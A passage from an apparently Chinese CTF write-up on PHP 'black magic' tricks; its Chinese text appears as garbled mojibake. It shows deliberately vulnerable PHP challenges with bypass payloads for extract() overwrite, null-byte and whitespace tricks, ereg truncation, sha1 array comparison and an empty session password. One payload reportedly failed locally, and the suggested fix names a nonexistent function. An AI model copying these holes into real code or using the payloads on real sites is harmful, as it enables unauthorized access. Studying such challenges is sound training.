title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h4><p>é¢˜ç›®ä½¿ç”¨<code>extract($_GET)</code>æ¥å—è¯·æ±‚ï¼Œå¹¶å°†å…¶é”®åå’Œé”®å€¼è½¬æ¢ä¸ºå˜é‡åå’Œå˜é‡å€¼ï¼Œéšåè¿›è¡Œifæ¡ä»¶çš„åˆ¤æ–­ã€‚$flagæ˜¯ä¸€ä¸ªè¾“å…¥çš„å˜é‡ï¼Œ<code>file_get_contents($flag)</code>æ‰“å¼€çš„ä¸€å®šæ˜¯ç©ºæ–‡ä»¶ï¼Œæ‰€ä»¥<code>$content</code>ä¸€å®šä¸ºç©º</p><blockquote><p>è§£é¢˜å…³é”®åœ¨äºä»¤$shiyan&#x3D;&#x3D;$content</p></blockquote><p>ä½¿ç”¨GETæäº¤å‚æ•°å’Œå€¼ï¼Œåˆ©ç”¨<code>extract($_GET)</code>è¿›è¡Œè¦†ç›–ï¼Œä½¿flagå’Œshiyançš„å€¼éƒ½ä¸ºç©ºï¼Œä»è€Œæ»¡è¶³ifæ¡ä»¶ï¼Œè¾“å‡ºflagã€‚</p><p><strong>æœ€ç»ˆpayload</strong>ï¼š<code>?flag=&amp;shiyan=</code></p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-01_19-11-39.png"></p><h3 id="04-ç»•è¿‡è¿‡æ»¤çš„ç©ºç™½å­—ç¬¦"><a href="#04-ç»•è¿‡è¿‡æ»¤çš„ç©ºç™½å­—ç¬¦" class="headerlink" title="04 ç»•è¿‡è¿‡æ»¤çš„ç©ºç™½å­—ç¬¦"></a>04 ç»•è¿‡è¿‡æ»¤çš„ç©ºç™½å­—ç¬¦</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#é¢˜ç›®æºä»£ç </span><br><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-variable">$info</span> = <span class="hljs-string">&quot;&quot;</span>; <br><span class="hljs-variable">$req</span> = [];<br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;</span>;<br> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_error&quot;</span>, <span class="hljs-literal">false</span>); <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <br> <br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;number&#x27;</span>]))&#123;<br>   <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;hint:26966dc52e85af40f59b4fe73d8c323a.txt&quot;</span>);<br> <br>   <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;have a fun!!&quot;</span>);<br> <br>&#125;<br> <br><span class="hljs-keyword">foreach</span>([<span class="hljs-variable">$_GET</span>, <span class="hljs-variable">$_POST</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$global_var</span>) &#123;  <br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$global_var</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123; <br>        <span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$value</span>); <br>        <span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$value</span>) &amp;&amp; <span class="hljs-variable">$req</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$value</span>); <br>    &#125; <br>&#125; <br> <br> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_palindrome_number</span>(<span class="hljs-params"><span class="hljs-variable">$number</span></span>) </span>&#123; <br>    <span class="hljs-variable">$number</span> = <span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-variable">$number</span>);<br>    <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <br>    <span class="hljs-variable">$j</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$number</span>) - <span class="hljs-number">1</span>; <br>    <span class="hljs-keyword">while</span>(<span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$j</span>) &#123; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$number</span>[<span class="hljs-variable">$i</span>] !== <span class="hljs-variable">$number</span>[<span class="hljs-variable">$j</span>]) &#123; <br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <br>        &#125; <br>        <span class="hljs-variable">$i</span>++; <br>        <span class="hljs-variable">$j</span>--; <br>    &#125; <br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <br>&#125; <br> <br> <br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;number&#x27;</span>])) <br>&#123;<br> <br>   <span class="hljs-variable">$info</span>=<span class="hljs-string">&quot;sorry, you cann&#x27;t input a number!&quot;</span>;<br> <br>&#125;<br><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$req</span>[<span class="hljs-string">&#x27;number&#x27;</span>]!=<span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$req</span>[<span class="hljs-string">&#x27;number&#x27;</span>])))<br>&#123;<br> <br>     <span class="hljs-variable">$info</span> = <span class="hljs-string">&quot;number must be equal to it&#x27;s integer!! &quot;</span>;  <br> <br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br> <br>     <span class="hljs-variable">$value1</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$req</span>[<span class="hljs-string">&quot;number&quot;</span>]);<br>     <span class="hljs-variable">$value2</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$req</span>[<span class="hljs-string">&quot;number&quot;</span>]));  <br> <br>     <span class="hljs-keyword">if</span>(<span class="hljs-variable">$value1</span>!=<span class="hljs-variable">$value2</span>)&#123;<br>          <span class="hljs-variable">$info</span>=<span class="hljs-string">&quot;no, this is not a palindrome number!&quot;</span>;<br>     &#125;<br>     <span class="hljs-keyword">else</span><br>     &#123;<br> <br>          <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_palindrome_number</span>(<span class="hljs-variable">$req</span>[<span class="hljs-string">&quot;number&quot;</span>]))&#123;<br>              <span class="hljs-variable">$info</span> = <span class="hljs-string">&quot;nice! <span class="hljs-subst">&#123;$value1&#125;</span> is a palindrome number!&quot;</span>; <br>          &#125;<br>          <span class="hljs-keyword">else</span><br>          &#123;<br>             <span class="hljs-variable">$info</span>=<span class="hljs-variable">$flag</span>;<br>          &#125;<br>     &#125;<br> <br>&#125;<br> <br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$info</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="è§£é¢˜æ€è·¯-3"><a href="#è§£é¢˜æ€è·¯-3" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h4><p>è¿™ä¸ªä»£ç å¥½é•¿è®©æˆ‘æ¥è®¤çœŸçœ‹ä¸€ä¸‹ğŸ§</p><p>ä»æœ€åçœ‹<code>echo $info</code>ã€<code>$info=$flag</code>ï¼Œæˆ‘ä»¬çŸ¥é“å¦‚æœæ»¡è¶³å‰é¢çš„æ¡ä»¶ï¼Œflagä¼šè¢«èµ‹å€¼ç»™<code>$info</code>å¹¶è¾“å‡ºã€‚</p><p>å†å¾€ä¸Šæ‰¾æ¡ä»¶</p><p>è¦ä¸æ»¡è¶³æ¡ä»¶ï¼Œå³<code>is_palindrome_number($req[&quot;number&quot;])</code>ä¸ºå‡ã€‚</p><p>å‰é¢ä»£ç æœ‰å†™<code>is_palindrome_number</code>å‡½æ•°ç”¨æ¥åˆ¤æ–­å›æ–‡æ•°å­—ã€‚</p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-01_19-24-52.png"></p><p>è¦æ»¡è¶³<code>$value1=$value2</code>ï¼Œå³<code>intval($req[&quot;number&quot;])=intval(strrev($req[&quot;number&quot;]))</code>ï¼Œ$valueåè½¬åä¸èƒ½å’ŒåŸæ¥ç›¸ç­‰ã€‚</p><blockquote><p>strrev()å‡½æ•°åè½¬å­—ç¬¦ä¸²</p></blockquote><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-01_19-31-22.png"></p><p><code>is_numberic($REAUEST[&#39;NUMBER&#39;]</code>éœ€è¦ä¸ºå‡ï¼Œä¸”<code>$req[&#39;number&#39;]==strval(intval(eq[&#39;number&#39;])</code></p><p>å†çœ‹çœ‹ä¸Šé¢</p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-01_19-52-30.png"></p><p>æˆ‘ä»¬è¦åœ¨urlä¼ å…¥ä¸€ä¸ªåä¸º<strong>number</strong>çš„å˜é‡</p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-01_19-59-58.png"></p><p>è¿™æ®µçš„æ„æ€æ˜¯æŠŠæˆ‘ä»¬æ‰€æœ‰çš„è¾“å…¥æ”¶é›†åˆ°$global_varåˆ—è¡¨é‡Œï¼Œæ­¤æ—¶åˆ—è¡¨**$global_var&#x3D;[<em>$number</em>]<strong>ã€‚å†è¿›å…¥ä¸‹ä¸€æ­¥å¾ªç¯ï¼Œå°†é”®åèµ‹å€¼ç»™$keyï¼Œå˜é‡çš„å€¼èµ‹å€¼ç»™$valueï¼Œå³</strong>$key&#x3D;0ï¼Œ$value&#x3D;$number**ã€‚</p><p>è¿›å…¥å¾ªç¯å†…éƒ¨åï¼Œtrim()å‡½æ•°å»é™¤å˜é‡é¦–å°¾çš„ç©ºç™½å­—ç¬¦æˆ–å…¶ä»–å­—ç¬¦åéœ€æ»¡è¶³æ¡ä»¶<code>is_string($value) &amp;&amp; $req[$key] = addslashes($value)</code>ï¼Œå³$valueä¸ºå­—ç¬¦ä¸²å¹¶ç»™å­—ç¬¦ä¸²åŠ åæ–œçº¿ã€‚</p><p>åˆ¤æ–­æ¡ä»¶å¦‚ä¸‹</p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-01_20-29-48.png"></p><p>ç»¼ä¸Šï¼Œè¦ä¼ å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå­—ç¬¦ä¸²ä¸èƒ½æ˜¯æ•°å­—è¿˜å¿…é¡»æ˜¯æ•´æ•°ï¼Œä¸æ˜¯å›æ–‡æ•°å­—è¿˜è¦æ˜¯å›æ–‡æ•°å­—ğŸ˜…ã€‚</p><p>æ‚–è®ºï¼<del>çƒ¦æ­»äº†ä¸åšäº†å»æš´æ‰“å‡ºé¢˜äºº</del></p><p>æ²¡å…³ç³»æˆ‘ä»¬å¯ä»¥ç»•è¿‡ã€‚</p><p><code>intval()</code>å’Œ <code>is_numeric()</code>å‡½æ•°åœ¨å¼€å§‹åˆ¤æ–­å‰ï¼Œä¼šå…ˆè·³è¿‡æ‰€æœ‰ç©ºç™½å­—ç¬¦ï¼Œä½†æ˜¯<code>is_palindrome_number()</code>ä¸ä¼šï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹ç‚¹ï¼Œåœ¨ä¸€ä¸ªå›æ–‡æ•°å­—ä¹‹å‰åŠ ä¸Šä¸€ä¸ªç©ºç™½å­—ç¬¦ï¼Œæ¯”å¦‚<code>\f121</code>å°±æ˜¯<code>%0c121</code></p><p>å†ç”¨%00ç»•è¿‡<code>is_numeric($_REQUEST[&#39;number&#39;])</code></p><p><strong>æœ€ç»ˆplayload</strong>ï¼š<code>?number=%00%0c121</code></p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-01_21-14-18.png"></p><p>è¿™ä¸ªæ€ä¹ˆè¿˜æ˜¾ç¤ºä»£ç æ</p><h3 id="05-ereg-x2F-preg-match-æ­£åˆ™-00-æˆªæ–­"><a href="#05-ereg-x2F-preg-match-æ­£åˆ™-00-æˆªæ–­" class="headerlink" title="05 ereg&#x2F;preg_match æ­£åˆ™ %00 æˆªæ–­"></a>05 ereg&#x2F;preg_match æ­£åˆ™ %00 æˆªæ–­</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#é¢˜ç›®æºä»£ç </span><br><span class="hljs-meta">&lt;?php</span> <br><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag&quot;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) <br>&#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ereg</span> (<span class="hljs-string">&quot;^[a-zA-Z0-9]+$&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) === <span class="hljs-literal">FALSE</span>)<br>  &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&#x27;</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) &lt; <span class="hljs-number">8</span> &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>] &gt; <span class="hljs-number">99999999</span>)<br>   &#123;<br>     <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-string">&#x27;*-*&#x27;</span>) !== <span class="hljs-literal">FALSE</span>) <span class="hljs-comment">//strpos â€” æŸ¥æ‰¾å­—ç¬¦ä¸²é¦–æ¬¡å‡ºç°çš„ä½ç½®</span><br>      &#123;<br>      <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span> . <span class="hljs-variable">$flag</span>);<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;&lt;p&gt;*-* have not been found&lt;/p&gt;&#x27;</span>); <br>       &#125;<br>      &#125;<br>     <span class="hljs-keyword">else</span> <br>     &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Invalid password&lt;/p&gt;&#x27;</span>; <br>      &#125;<br>   &#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="è§£é¢˜æ€è·¯-4"><a href="#è§£é¢˜æ€è·¯-4" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h4><h5 id="001-00æˆªæ–­"><a href="#001-00æˆªæ–­" class="headerlink" title="001 %00æˆªæ–­"></a>001 %00æˆªæ–­</h5><p>éœ€è¦æ»¡è¶³æ¡ä»¶<code>ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;])</code>ä¸ä¸ºfalseï¼Œå³è¾“å…¥çš„å€¼å¿…é¡»æœ‰å¤§å°å†™<strong>å­—æ¯æˆ–è€…æ•°å­—</strong>ã€‚</p><p>è¿˜éœ€æ»¡è¶³<code>strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 99999999</code>ï¼Œå³è¾“å…¥å€¼<strong>é•¿åº¦å°äº8</strong>ä¸”<strong>å¤§äº99999999</strong>ã€‚</p><p>æœ€åè¦æ»¡è¶³<code>strpos ($_GET[&#39;password&#39;], &#39;*-*&#39;) !== FALSE</code>ï¼Œä¹Ÿå°±æ˜¯è¾“å…¥ä¸­å¿…é¡»æœ‰***-***ã€‚ä½†æ˜¯è¿™æ¡å’Œç¬¬ä¸€æ¡ç›¸æ‚–ï¼Œä¸æ…Œï¼Œå§å·²ç»è§è¿‡å¤§ä¸–é¢äº†ï¼Œå§å¯ä»¥ç»•è¿‡å®ƒã€‚</p><blockquote><p>å½“eregè¯­å¥é‡åˆ°%00çš„æ—¶å€™å°±ä¼šè®¤ä¸ºæ˜¯ä¼‘æ­¢ç¬¦ï¼Œä¸å†å¾€åçœ‹</p></blockquote><p>å¯ä»¥åœ¨å­—ç¬¦ä¸²ä¸­æ·»åŠ %00ï¼Œåœ¨å®ƒä¹‹ååŠ *-*ï¼Œéª—ä¸€ä¸‹ç¬¬ä¸€ä¸ªåˆ¤æ–­æ¡ä»¶ã€‚</p><p>ç¬¬äºŒä¸ªæ¡ä»¶å¯ä»¥ä½¿ç”¨ç§‘å­¦è®¡æ•°æ³•ï¼Œæ¯”å¦‚1e10ã€‚</p><p><strong>æœ€ç»ˆplayload</strong>ï¼š<code>?password=1e10%00*-*</code></p><p>æœ¬åœ°å¤ç°æ²¡æˆåŠŸï¼Œæˆ‘å¥½å¾—å¾ˆå“‡æˆ‘å¥½çš„å¾ˆå“‡ğŸ˜…</p><h4 id="æŠ¥é”™"><a href="#æŠ¥é”™" class="headerlink" title="æŠ¥é”™"></a>æŠ¥é”™</h4><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-02_20-17-52.png"></p><p>æœ¬åœ°å¤ç°ä¸æˆåŠŸæ˜¯æ‰“ä¸å€’æˆ‘çš„ï¼Œæˆ‘æ“…é•¿ä½¿ç”¨ç™¾åº¦ã€‚</p><p>ç¿»è¯‘äº†ä¸€ä¸‹æ˜¯â€œè°ƒç”¨äº†æœªå®šä¹‰å‡½æ•°â€ã€‚åœ¨php5.3ä»¥ä¸Šçš„ç‰ˆæœ¬å°†ä¸å†æ”¯æŒeregi()å’Œereg()å‡½æ•°ï¼Œçœ‹äº†ä¸€ä¸‹çš„æˆ‘çš„ç‰ˆæœ¬å·æ˜¯7.3ã€‚</p><p>é—®é¢˜ä¹Ÿä¸æ˜¯ä¸å¯é¿å…ï¼Œåªéœ€è¦æ”¹ä¸€ä¸‹æ ¼å¼ï¼ŒæŠŠ<code>ereg()</code>æ”¹æˆ<code>erge_match()</code>å°±è¡Œã€‚</p><p><del>ä½†æˆ‘ä¸ä¼šæ”¹</del>ğŸ˜£</p><h4 id="002-æ•°ç»„ç»•è¿‡-1"><a href="#002-æ•°ç»„ç»•è¿‡-1" class="headerlink" title="002 æ•°ç»„ç»•è¿‡"></a>002 æ•°ç»„ç»•è¿‡</h4><p>å†²æµªå†²åˆ°çš„å¦å¤–ä¸€ç§æ–¹æ³•</p><p>åœ¨trueå’Œfalseä¹‹å¤–è¿˜æœ‰ä¸€ä¸ªè¿”å›å€¼æ˜¯nullã€‚å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‰¹ç‚¹è¿›è¡Œç»•è¿‡ã€‚</p><p>ereg() åªèƒ½å¤„ç†å­—ç¬¦ä¸²ï¼Œé‡åˆ°æ•°ç»„ä¼šè¿”å›nullï¼Œè€Œä¸”<code>null !== false</code>ã€‚åŒæ—¶ï¼Œstrlen()ä¹Ÿä¸èƒ½å¤„ç†æ•°ç»„ï¼Œä¹Ÿä¼šè¿”å›nullï¼Œnullçš„é•¿åº¦å°äº8ã€‚</p><p>å› ä¸ºè¦è¾“å…¥æ•°ç»„ï¼Œæ•°ç»„å¤§äºæ•´æ•°ï¼Œæ‰€ä»¥ä¸€å®šä¼šè¿”å›trueã€‚</p><p><strong>æœ€ç»ˆplayload</strong>ï¼š<code>?password=[]=1</code></p><h3 id="06-sha-å‡½æ•°æ¯”è¾ƒç»•è¿‡"><a href="#06-sha-å‡½æ•°æ¯”è¾ƒç»•è¿‡" class="headerlink" title="06 sha()å‡½æ•°æ¯”è¾ƒç»•è¿‡"></a>06 sha()å‡½æ•°æ¯”è¾ƒç»•è¿‡</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#é¢˜ç›®æºä»£ç </span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;Modiferç»ˆå°†å¦ææ³°æ¥&quot;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) <br>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>] == <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&#x27;</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))<br>      <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Invalid password.&lt;/p&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Login first!&lt;/p&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="è§£é¢˜æ€è·¯-5"><a href="#è§£é¢˜æ€è·¯-5" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h4><p>è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š<code>($_GET[&#39;name&#39;] ï¼== $_GET[&#39;password&#39;]</code>å’Œ</p><p><code>sha1($_GET[&#39;name&#39;]) === sha1($_GET[&#39;password&#39;])</code>ã€‚</p><p>å°±æ˜¯è¦è®©è¾“å…¥çš„ä¸¤ä¸ªå˜é‡ä¸ç›¸ç­‰ä½†æ˜¯sha1åŠ å¯†åç›¸ç­‰ã€‚</p><p>ä¸åŒçš„å­—ç¬¦ä¸²ç»è¿‡sha1åŠ å¯†åä¸€å®šä¸åŒï¼Œä½†æ˜¯sha1ä¸èƒ½åŠ å¯†æ•°ç»„ï¼Œä¼šæŠ¥é”™è¿”å›nullï¼Œå¦‚æœè®©ä¸¤ä¸ªå˜é‡åŒæ—¶è¿”å›nullå°±ä¼šç›¸ç­‰è¾£ã€‚</p><p><strong>æœ€ç»ˆplayload</strong>ï¼š<code>?name[]=1&amp;password[]=2</code></p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-02_20-57-05.png"></p><h3 id="07-session-éªŒè¯ç»•è¿‡"><a href="#07-session-éªŒè¯ç»•è¿‡" class="headerlink" title="07 session éªŒè¯ç»•è¿‡"></a>07 session éªŒè¯ç»•è¿‡</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#é¢˜ç›®æºä»£ç </span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;Modifierç»ˆå°†å¦ææ³°æ¥&quot;</span>;<br><br><span class="hljs-title function_ invoke__">session_start</span>(); <br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>] == <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;password&#x27;</span>])<br>        <span class="hljs-keyword">die</span> (<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;&lt;p&gt;Wrong guess.&lt;/p&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">mt_srand</span>((<span class="hljs-title function_ invoke__">microtime</span>() ^ <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10000</span>)) % <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10000</span>) + <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10000</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h4><p>è¦æ»¡è¶³æ¡ä»¶<code>$_GET[&#39;password&#39;] == $_SESSION[&#39;password&#39;]</code></p><blockquote><p>$_SESSION()å­˜å‚¨ä¼šè¯ä¿¡æ¯</p></blockquote><p>è¿™é‡Œsessionä¸­çš„passwordéœ€è¦æˆ‘ä»¬è‡ªå·±ä¼ å…¥ï¼Œå¦‚æœä¸ä¼ å°±æ˜¯nullï¼ŒåŒæ—¶passwordä¹Ÿä¼ ç©ºï¼ŒäºŒè€…å°±ç›¸ç­‰å•¦</p><p><strong>æœ€ç»ˆplayload</strong>ï¼š<code>?password=</code></p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-02_21-40-38.png"></p><h3 id="08-urldecode-äºŒæ¬¡ç¼–ç ç»•è¿‡"><a href="#08-urldecode-äºŒæ¬¡ç¼–ç ç»•è¿‡" class="headerlink" title="08 urldecode äºŒæ¬¡ç¼–ç ç»•è¿‡"></a>08 urldecode äºŒæ¬¡ç¼–ç ç»•è¿‡</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 